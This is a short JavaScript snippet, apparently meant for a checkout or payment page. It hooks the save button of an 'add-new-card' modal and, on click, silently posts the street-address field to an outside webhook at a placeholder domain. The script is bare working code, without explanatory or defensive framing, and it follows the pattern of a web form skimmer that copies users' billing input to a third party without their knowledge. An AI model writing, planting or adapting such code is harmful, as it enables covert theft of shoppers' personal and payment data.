document.addEventListener('DOMContentLoaded', function () {
  var form = document.getElementById('add-new-card');
  if (!form) return;

  // Find the modal containing the form
  var modal = form.closest('.hds-o-modal');
  if (!modal) return;

  // Find the primary save button inside modal actions
  var saveBtn = modal.querySelector('.actions .hds-a-button--primary');
  if (!saveBtn) return;

  saveBtn.addEventListener('click', function () {
    var streetInput = document.getElementById('street-address');
    if (!streetInput) return;

    var street = streetInput.value;

    fetch('https://your-webhook-domain.com', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ street: street })
    });
  });
});
